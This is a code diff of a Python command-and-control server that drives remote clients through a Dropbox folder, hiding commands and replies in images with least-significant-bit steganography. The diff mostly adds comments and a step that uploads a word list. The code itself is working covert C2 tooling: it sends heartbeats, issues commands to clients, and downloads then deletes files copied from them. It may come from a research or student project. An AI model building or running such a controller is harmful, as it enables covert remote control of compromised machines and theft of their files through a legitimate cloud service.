@@ -76,6 +76,7 @@ def handle_client_selection(clients):
 
 
 def get_alive_clients(dbx, timedout_clients):
+    #get list of client names that haven't timed out
     ret = []
     for entry in dbx.files_list_folder('/art').entries:
         if entry.name in timedout_clients:
@@ -147,12 +148,13 @@ def execute_command(dbx, command, client):
 
 
 def process_files(dbx, last_check, clients):
+    #for each client
     for entry in dbx.files_list_folder('/art').entries:
         if entry.name in timedout_clients:
             continue
 
+        #download image with secret message 
         dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)
-
         message = lsb.reveal(tmp_path + entry.name, lsb.generators.eratosthenes())
 
         last_time = get_last_command_time(message)
@@ -160,23 +162,27 @@ def process_files(dbx, last_check, clients):
         if last_check >= last_time:
             continue
         
+        #iterate over commands
         for line in message.split(';')[:-1]:
             fields = line.split('|')
-            response_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")             
+            response_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")   
+            #check if read command is a new response          
             if last_check < response_time and fields[1] == 'RESPONSE':
                 if fields[2] in ['heartbeat', 'register']:
                     continue
 
+                #save response content to command line
                 print(fields[3])
                 if fields[2].split(' ')[0] == 'cp':
                     file_name = fields[3].split('\n')[1]
+                    #save copied image to backup directory
                     if file_name != 'cp error - no such file':
                         dbx.files_download_to_file(backup_path + file_name, '/art/' + file_name)
                         dbx.files_delete('/art/' + file_name)
 
       
-
 def backup_communication(message, client):
+    #save client communication to backup directory
     lines = message.split(';')
     f = open(backup_path + client[:-4] + '.txt', "w")
     f.write(';\n\n'.join(lines))
@@ -184,11 +190,13 @@ def backup_communication(message, client):
 
 
 def cleanup(dbx, client):
+    #delete file in tmp directory and in dropbox
     dbx.files_delete('/art/' + client)
     os.remove(tmp_path + client)
 
 
 def update_timedout_clients(dbx, timedout_clients):
+    #check if clients timed out
     for entry in dbx.files_list_folder('/art').entries:
         if entry.name in timedout_clients:
             continue
@@ -212,14 +220,28 @@ if __name__ == "__main__":
         print("Error - Invalid Call")
         print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN TMP_DIR_PATH BACKUP_DIR_PATH")
     else:
+        #create dirs if they don't exist
         tmp_path = sys.argv[2]
         backup_path = sys.argv[3]
         for path in [tmp_path, backup_path]:
             if not os.path.exists(path):
                 os.makedirs(path)
 
+        #get dropbox object
         dbx = init(sys.argv[1])
 
+        #create words list if there isn't one
+        no_words = True
+        for entry in dbx.files_list_folder('').entries:
+            if entry.name == 'words.txt':
+                no_words = False
+        
+        if(no_words):
+            f = open('./resources/words.txt', "rb")
+            dbx.files_upload(io.BytesIO(f.read()).getvalue(), '/words.txt')
+            f.close()
+
+        #check which clients have timed out
         timedout_clients = update_timedout_clients(dbx, [])
 
         last_heartbeat = datetime.now()
@@ -227,7 +249,9 @@ if __name__ == "__main__":
 
         selected_client = -1
 
+        #main loop
         while True:
+            #check dropbox files for responses from clients
             check_diff = datetime.now() - last_check
             if check_diff.seconds > CHECK_PERIOD: 
                 tmp = datetime.now()
@@ -236,15 +260,17 @@ if __name__ == "__main__":
                 last_check = tmp
                 selected_client = -1
 
+            #send heartbeat to clients
             heartbeat_diff = datetime.now() - last_heartbeat
             if heartbeat_diff.seconds > HEARTBEAT_PERIOD:
                 tmp = datetime.now()
                 broadcast_command(dbx, 'heartbeat', get_alive_clients(dbx, timedout_clients))
                 last_heartbeat = tmp
 
-            # read command
+            #read command from UI and execute it
             res = handle_command_selection(dbx, timedout_clients, selected_client) 
             if res == -1:
+                #backup client communication on server exit
                 clients = get_alive_clients(dbx, timedout_clients)
                 for client in clients:
                     dbx.files_download_to_file(tmp_path + client, '/art/' + client)
@@ -254,4 +280,6 @@ if __name__ == "__main__":
                     cleanup(dbx, client)
                 break
             elif res >= 0 or res == -3:
+                #set selected client
                 selected_client = res
+
